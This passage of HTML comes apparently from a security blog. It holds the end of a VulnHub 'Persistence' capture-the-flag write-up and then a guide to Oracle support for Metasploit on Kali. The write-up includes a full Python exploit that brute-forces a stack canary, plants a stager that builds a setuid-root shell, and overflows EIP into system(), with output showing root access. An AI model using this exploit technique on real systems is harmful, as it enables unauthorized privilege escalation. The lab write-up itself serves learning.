</span><span class='line'><span class="s">|  o  )  [_ |  D  )(   \_  |  (   \_ |      | /  [_ |  _  | /  /  /  [_ </span>
</span><span class='line'><span class="s">|   _/    _]|    /  \__  | |  |\__  ||_|  |_||    _]|  |  |/  /  |    _]</span>
</span><span class='line'><span class="s">|  | |   [_ |    \  /  \ | |  |/  \ |  |  |  |   [_ |  |  /   \_ |   [_ </span>
</span><span class='line'><span class="s">|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |</span>
</span><span class='line'><span class="s">|__| |_____||__|\_|  \___||____|\___|  |__|  |_____||__|__|\____||_____|</span>
</span><span class='line'><span class="s">      _____ ____  _       ___  ____  ______ </span>
</span><span class='line'><span class="s">     / ___/|    \| |     /   \|    ||      |</span>
</span><span class='line'><span class="s">    (   \_ |  o  ) |    |     ||  | |      |</span>
</span><span class='line'><span class="s">     \__  ||   _/| |___ |  O  ||  | |_|  |_|</span>
</span><span class='line'><span class="s">     /  \ ||  |  |     ||     ||  |   |  |  </span>
</span><span class='line'><span class="s">     \    ||  |  |     ||     ||  |   |  |  </span>
</span><span class='line'><span class="s">      \___||__|  |_____| \___/|____|  |__|  </span>
</span><span class='line'><span class="s">                                        </span>
</span><span class='line'><span class="s">                A: &quot;AKA: FU superkojiman &amp;&amp; sagi- !!&quot;</span>
</span><span class='line'><span class="s">                A: &quot;I also have no idea what I am doing&quot;</span>
</span><span class='line'><span class="s">&quot;&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Connecting &amp; starting canary brute force...&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># start the canary brute loop. We want to brute 4 bytes ...</span>
</span><span class='line'><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># ... and try all possibilities</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">canary_byte</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># prepare the byte</span>
</span><span class='line'>        <span class="n">hex_byte</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">canary_byte</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># prepare the payload</span>
</span><span class='line'>        <span class="n">send</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="n">hex_byte</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># connect and send payload</span>
</span><span class='line'>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">3333</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># get the inital banners</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">35</span><span class="p">)</span>   <span class="c"># [+] hello, my name is sploitable\n</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span>   <span class="c"># [+] would you like to play a game?\n </span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>    <span class="c"># &gt; </span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># send the payload  </span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">send</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">27</span><span class="p">)</span>   <span class="c"># [+] yeah, I don&#39;t think so\n</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># if we have a OK response, then we will have this last part</span>
</span><span class='line'>        <span class="c"># as &#39;[+] bye!\n&#39; populated, if its wrong, not</span>
</span><span class='line'>        <span class="n">data</span> <span class="o">=</span>  <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>   <span class="c"># [+] bye!\n</span>
</span><span class='line'>        <span class="k">if</span> <span class="s">&quot;bye&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;[+] Found a possible canary value of &#39;{0}&#39;!&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hex_byte</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span>
</span><span class='line'>            <span class="n">canary</span> <span class="o">+=</span> <span class="n">hex_byte</span>
</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>            <span class="k">break</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>    <span class="c"># if we cant even find the first byte, we failed already</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[-] Unable to even find the first bit of the canary. No luck&quot;</span>
</span><span class='line'>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># The canary is our ticket out of here!</span>
</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Canary known as : {0}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">canary</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Writing /tmp/log to be called by wopr later&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># ./wopr has the string /tmp/log in it. We will use this as</span>
</span><span class='line'>    <span class="c"># our code exec point, overwriting whatever is in it atm</span>
</span><span class='line'>    <span class="n">stager</span> <span class="o">=</span> <span class="s">&quot;&quot;&quot;</span>
</span><span class='line'><span class="s">        #!/bin/sh</span>
</span><span class='line'>
</span><span class='line'><span class="s">        # First, prepare a small C shell and move it to /tmp with name getroot</span>
</span><span class='line'><span class="s">        echo &quot;int main(void)</span><span class="se">\n</span><span class="s">{</span><span class="se">\n</span><span class="s">setuid(0);</span><span class="se">\n</span><span class="s">system(</span><span class="se">\\</span><span class="s">&quot;/bin/sh</span><span class="se">\\</span><span class="s">&quot;);</span><span class="se">\n</span><span class="s">return 0;</span><span class="se">\n</span><span class="s">}&quot; &gt; /tmp/getroot.c</span>
</span><span class='line'>
</span><span class='line'><span class="s">        # compile it</span>
</span><span class='line'><span class="s">        /usr/bin/gcc /tmp/getroot.c -o /tmp/getroot</span>
</span><span class='line'>
</span><span class='line'><span class="s">        # change ownership and setuid</span>
</span><span class='line'><span class="s">        /bin/chown root:root /tmp/getroot</span>
</span><span class='line'><span class="s">        /bin/chmod 4777 /tmp/getroot</span>
</span><span class='line'><span class="s">    &quot;&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># write the file</span>
</span><span class='line'>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;/tmp/log&#39;</span><span class="p">,</span><span class="s">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">stager_file</span><span class="p">:</span>
</span><span class='line'>        <span class="n">stager_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">stager</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># make it executable</span>
</span><span class='line'>    <span class="n">os</span><span class="o">.</span><span class="n">chmod</span><span class="p">(</span><span class="s">&#39;/tmp/log&#39;</span><span class="p">,</span> <span class="mo">0755</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># now, with the stack canary known and the stager ready, lets corrupt</span>
</span><span class='line'>    <span class="c"># EIP and sploit!</span>
</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">canary</span>               <span class="c"># canary we bruted</span>
</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">4</span>              <span class="c"># padding to EIP wich is at byte 42</span>
</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x10\x62\xe5\xb7</span><span class="s">&quot;</span>   <span class="c"># system() @ 0xb7e56210, NULL is ok cause memcpy(). Recheck location of system in gdb incase the sploit fails.</span>
</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;JUNK&quot;</span>               <span class="c"># JUNK. Should probably do exit() here. Meh.</span>
</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x60\x8c\x04\x08</span><span class="s">&quot;</span>   <span class="c"># location if /tmp/log string in .data</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># and connect &amp;&amp; send</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Connecting to service&quot;</span>
</span><span class='line'>    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">3333</span><span class="p">))</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">35</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Sending Payload&quot;</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Done&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)&quot;</span>
</span><span class='line'>    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/tmp/getroot&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[!] Incomplete Canary. Can&#39;t continue reliably&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># done</span>
</span></code></pre></td></tr></table></div></figure>


<p>A sample run would be:</p>

<figure class='code'><figcaption><span>Running sploit.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>ls -lah /tmp/sploit.py
</span><span class='line'>-rw-rw-r--. 1 avida avida 4.0K Sep 18 10:33 /tmp/sploit.py
</span><span class='line'>bash-4.1<span class="nv">$ </span>python /tmp/sploit.py
</span><span class='line'>
</span><span class='line'>            A: <span class="s2">&quot;So, I heard you like pain...?&quot;</span>
</span><span class='line'>            B: <span class="s2">&quot;... a bit&quot;</span>
</span><span class='line'>            C: <span class="s2">&quot;Well, here it is, the: &quot;</span>
</span><span class='line'> ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___
</span><span class='line'><span class="p">|</span>    <span class="se">\ </span>/  _<span class="o">]</span><span class="p">|</span>    <span class="se">\ </span> / ___/<span class="p">|</span>    / ___/<span class="p">|</span>      <span class="p">|</span>  /  _<span class="o">]</span><span class="p">|</span>    <span class="se">\ </span>  /  <span class="o">]</span>  /  _<span class="o">]</span>
</span><span class='line'><span class="p">|</span>  o  <span class="o">)</span>  <span class="o">[</span>_ <span class="p">|</span>  D  <span class="o">)(</span>   <span class="se">\_</span>  <span class="p">|</span>  <span class="o">(</span>   <span class="se">\_</span> <span class="p">|</span>      <span class="p">|</span> /  <span class="o">[</span>_ <span class="p">|</span>  _  <span class="p">|</span> /  /  /  <span class="o">[</span>_
</span><span class='line'><span class="p">|</span>   _/    _<span class="o">]</span><span class="p">|</span>    /  <span class="se">\_</span>_  <span class="p">|</span> <span class="p">|</span>  <span class="p">|</span><span class="se">\_</span>_  <span class="o">||</span>_<span class="p">|</span>  <span class="p">|</span>_<span class="o">||</span>    _<span class="o">]</span><span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>/  /  <span class="p">|</span>    _<span class="o">]</span>
</span><span class='line'><span class="p">|</span>  <span class="p">|</span> <span class="p">|</span>   <span class="o">[</span>_ <span class="p">|</span>    <span class="se">\ </span> /  <span class="se">\ </span><span class="p">|</span> <span class="p">|</span>  <span class="p">|</span>/  <span class="se">\ </span><span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>   <span class="o">[</span>_ <span class="p">|</span>  <span class="p">|</span>  /   <span class="se">\_</span> <span class="p">|</span>   <span class="o">[</span>_
</span><span class='line'><span class="p">|</span>  <span class="p">|</span> <span class="p">|</span>     <span class="o">||</span>  .  <span class="se">\ \ </span>   <span class="p">|</span> <span class="p">|</span>  <span class="p">|</span><span class="se">\ </span>   <span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>     <span class="o">||</span>  <span class="p">|</span>  <span class="se">\ </span>    <span class="o">||</span>     <span class="p">|</span>
</span><span class='line'><span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="o">||</span>__<span class="p">|</span><span class="se">\_</span><span class="p">|</span>  <span class="se">\_</span>__<span class="o">||</span>____<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>  <span class="p">|</span>__<span class="p">|</span>  <span class="p">|</span>_____<span class="o">||</span>__<span class="p">|</span>__<span class="p">|</span><span class="se">\_</span>___<span class="o">||</span>_____<span class="p">|</span>
</span><span class='line'>      _____ ____  _       ___  ____  ______
</span><span class='line'>     / ___/<span class="p">|</span>    <span class="se">\|</span> <span class="p">|</span>     /   <span class="se">\|</span>    <span class="o">||</span>      <span class="p">|</span>
</span><span class='line'>    <span class="o">(</span>   <span class="se">\_</span> <span class="p">|</span>  o  <span class="o">)</span> <span class="p">|</span>    <span class="p">|</span>     <span class="o">||</span>  <span class="p">|</span> <span class="p">|</span>      <span class="p">|</span>
</span><span class='line'>     <span class="se">\_</span>_  <span class="o">||</span>   _/<span class="p">|</span> <span class="p">|</span>___ <span class="p">|</span>  O  <span class="o">||</span>  <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>  <span class="p">|</span>_<span class="p">|</span>
</span><span class='line'>     /  <span class="se">\ </span><span class="o">||</span>  <span class="p">|</span>  <span class="p">|</span>     <span class="o">||</span>     <span class="o">||</span>  <span class="p">|</span>   <span class="p">|</span>  <span class="p">|</span>
</span><span class='line'>     <span class="se">\ </span>   <span class="o">||</span>  <span class="p">|</span>  <span class="p">|</span>     <span class="o">||</span>     <span class="o">||</span>  <span class="p">|</span>   <span class="p">|</span>  <span class="p">|</span>
</span><span class='line'>      <span class="se">\_</span>__<span class="o">||</span>__<span class="p">|</span>  <span class="p">|</span>_____<span class="p">|</span> <span class="se">\_</span>__/<span class="p">|</span>____<span class="p">|</span>  <span class="p">|</span>__<span class="p">|</span>
</span><span class='line'>
</span><span class='line'>                A: <span class="s2">&quot;AKA: FU superkojiman &amp;&amp; sagi- !!&quot;</span>
</span><span class='line'>                A: <span class="s2">&quot;I also have no idea what I am doing&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Connecting <span class="p">&amp;</span> starting canary bruteforce...
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;64&#39;</span>!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;d3&#39;</span>!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;c6&#39;</span>!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;15&#39;</span>!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Canary known as : 64d3c615
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Writing /tmp/log to be called by wopr later
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Connecting to service
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Sending Payload
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Done
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> going to try and spawn /tmp/getroot, assuming the sploit worked :<span class="o">)</span>
</span><span class='line'>sh-4.1# id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>500<span class="o">(</span>avida<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,500<span class="o">(</span>avida<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span></code></pre></td></tr></table></div></figure>


<p>And, as proof, we cat the flag!</p>

<figure class='code'><figcaption><span>Persistence w00t</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sh-4.1# cat /root/flag.txt
</span><span class='line'>              .d8888b.  .d8888b. 888
</span><span class='line'>             d88P  Y88bd88P  Y88b888
</span><span class='line'>             888    888888    888888
</span><span class='line'>888  888  888888    888888    888888888
</span><span class='line'>888  888  888888    888888    888888
</span><span class='line'>888  888  888888    888888    888888
</span><span class='line'>Y88b 888 d88PY88b  d88PY88b  d88PY88b.
</span><span class='line'> <span class="s2">&quot;Y8888888P&quot;</span>  <span class="s2">&quot;Y8888P&quot;</span>  <span class="s2">&quot;Y8888P&quot;</span>  <span class="err">&quot;</span>Y888
</span><span class='line'>
</span><span class='line'>Congratulations!!! You have the flag!
</span><span class='line'>
</span><span class='line'>We had a great <span class="nb">time </span>coming up with the
</span><span class='line'>challenges <span class="k">for </span>this boot2root, and we
</span><span class='line'>hope that you enjoyed overcoming them.
</span><span class='line'>
</span><span class='line'>Special thanks goes out to @VulnHub <span class="k">for </span>
</span><span class='line'>hosting Persistence <span class="k">for </span>us, and to
</span><span class='line'>@recrudesce <span class="k">for </span>testing and providing
</span><span class='line'>valuable feedback!
</span><span class='line'>
</span><span class='line'>Until next <span class="nb">time</span>,
</span><span class='line'>      sagi- <span class="p">&amp;</span> superkojiman
</span></code></pre></td></tr></table></div></figure>


<h2>conclusion</h2>

<p>Persistence kicked ass!! I learned a ton and that is the ultimate win. Thanks sagi- &amp;&amp; superkojiman for an incredible challenge! Thanks Vulnhub for the hosting and community!</p>

<h2>thats not all</h2>

<p>There are however a few more things I&rsquo;d like to try.</p>

<ul>
<li>Find if and how we can root Persistence using <code>sysadmin-tool</code></li>
<li>Modify the exploit to a working ROP payload</li>
<li>Explore other avenues to break out of rbash</li>
</ul>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/08/17/kali-linux-oracle-support/">Kali Linux Oracle Support</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-08-17T15:46:49+02:00" pubdate data-updated="true">Aug 17<sup>th</sup>, 2014</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Recently I have had to get Oracle support sorted in my Kali Linux install. I will try not to rant about the reasons why it doesn&rsquo;t just work out of the box and just get the steps written down quickly. Typically, when you try to use a module such as <code>oracle_login</code>, metasploit may error out with:</p>

<figure class='code'><figcaption><span>Metasploit Oracle Error</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf auxiliary<span class="o">(</span>oracle_login<span class="o">)</span> &gt; run
</span><span class='line'>
</span><span class='line'><span class="o">[</span>-<span class="o">]</span> Failed to load the OCI library: cannot load such file -- oci8
</span><span class='line'><span class="o">[</span>-<span class="o">]</span> See http://www.metasploit.com/redmine/projects/framework/wiki/OracleUsage <span class="k">for </span>installation instructions
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
</span><span class='line'>msf auxiliary<span class="o">(</span>oracle_login<span class="o">)</span> &gt; run
</span></code></pre></td></tr></table></div></figure>


<p>The link provided seems a little out of date, so here is an updated guide.</p>

<h2>getting started</h2>

<p>First, if you dont have an account at oracle.com, you will <em>unfortunately</em> need one here. If you don&rsquo;t want to create one, don’t worry, a temp email works as well as you luckily don’t have to confirm ownership of it before you can download.</p>

<h2>sorting oracle first</h2>

<p>Anyways. Create yourself a directory <code>/opt/oracle</code> and <code>cd</code> there. In a browser, navigate to the <a href="http://www.oracle.com/technetwork/database/features/instant-client/index-097480.html">instant client downloads</a> url and choose your architecture. If you hate 32bit Kali, choose <a href="http://www.oracle.com/technetwork/database/features/instant-client/index-097480.html">Linux x86</a>, and 64bit Kali choose <a href="http://www.oracle.com/technetwork/topics/linuxx86-64soft-092277.html">Linux x86-64</a>.</p>

<p>Next, download the following packages and save them to <code>/opt/oracle</code>:</p>

<ul>
<li>instantclient-basic-linux-12.1.0.1.0.zip</li>
<li>instantclient-sqlplus-linux-12.1.0.1.0.zip</li>
<li>instantclient-sdk-linux-12.1.0.1.0.zip</li>
</ul>


<p>With those downloaded, extract the archives with the <code>unzip</code> command. This should leave you with a directory <code>/opt/oracle/instantclient_12_1/</code>. This is all the files needed to at least get the <code>sqlplus</code> client going. However, when we build the ruby stuff needed for Metasploit, we will need to hax a .so. Do this with:</p>

<figure class='code'><figcaption><span>so symlink</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/opt/oracle/instantclient_12_1# ln libclntsh.so.12.1 libclntsh.so
</span><span class='line'>
</span><span class='line'>root@kali:/opt/oracle/instantclient_12_1# ls -lh libclntsh.so
</span><span class='line'>lrwxrwxrwx 1 root root 17 Aug 17 15:37 libclntsh.so -&gt; libclntsh.so.12.1
</span></code></pre></td></tr></table></div></figure>


<p>The last step is to configure the environment so that your shell is&hellip; <em>oracle aware</em>. We do this by setting a few environment variables. I have chosen to just append the lines to the end of my <code>.bashrc</code> file</p>

<figure class='code'><figcaption><span>.bashrc</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/opt/oracle/instantclient_12_1# tail ~/.bashrc
</span><span class='line'>
</span><span class='line'><span class="c"># ORACLE</span>
</span><span class='line'><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/opt/oracle/instantclient_12_1
</span><span class='line'><span class="nb">export </span><span class="nv">SQLPATH</span><span class="o">=</span>/opt/oracle/instantclient_12_1
</span><span class='line'><span class="nb">export </span><span class="nv">TNS_ADMIN</span><span class="o">=</span>/opt/oracle/instantclient_12_1
</span><span class='line'><span class="nb">export </span><span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>/opt/oracle/instantclient_12_1
</span><span class='line'><span class="nb">export </span><span class="nv">ORACLE_HOME</span><span class="o">=</span>/opt/oracle/instantclient_12_1
</span></code></pre></td></tr></table></div></figure>


<p>Done! Log out and back and check that these are present in the output of <code>env</code>.</p>

<h2>sorting out metasploit</h2>

<p>The last thing we need to do is setup the metasploit part. For this we need to download <a href="https://github.com/kubo/ruby-oci8/archive/ruby-oci8-2.1.7.zip">ruby-oci8</a>. In <code>/opt/oracle</code>, download it:</p>

<figure class='code'><figcaption><span>download ruby-oci8</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/opt/oracle# wget https://github.com/kubo/ruby-oci8/archive/ruby-oci8-2.1.7.zip
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>2014-08-17 16:11:31 <span class="o">(</span>42.8 KB/s<span class="o">)</span> - <span class="sb">`</span>ruby-oci8-2.1.7.zip<span class="err">&#39;</span> saved <span class="o">[</span>278270<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>root@kali:/opt/oracle# unzip ruby-oci8-2.1.7.zip
</span><span class='line'>Archive:  ruby-oci8-2.1.7.zip
</span><span class='line'>fb913e32d8a09bd46e5bf549bd8e554f0870d384
</span><span class='line'>   creating: ruby-oci8-ruby-oci8-2.1.7/
</span><span class='line'>  inflating: ruby-oci8-ruby-oci8-2.1.7/.gitignore
</span><span class='line'>  inflating: ruby-oci8-ruby-oci8-2.1.7/.yardopts
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>  inflating: ruby-oci8-ruby-oci8-2.1.7/test/test_rowid.rb
</span><span class='line'>root@kali:/opt/oracle#
</span></code></pre></td></tr></table></div></figure>


<p>Next, move to the extracted directory and install the <code>ruby-dev</code> package if you have not already done so:</p>

<figure class='code'><figcaption><span>ruby-dev</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/opt/oracle# <span class="nb">cd </span>ruby-oci8-ruby-oci8-2.1.7/
</span><span class='line'>
</span><span class='line'>root@kali:/opt/oracle/ruby-oci8-ruby-oci8-2.1.7# apt-get install ruby-dev
</span></code></pre></td></tr></table></div></figure>


<p>Lastly, we will <code>make</code> &amp;&amp; <code>make install</code>. Logout and back in and test that the oracle tools in metasploit are functional :)</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
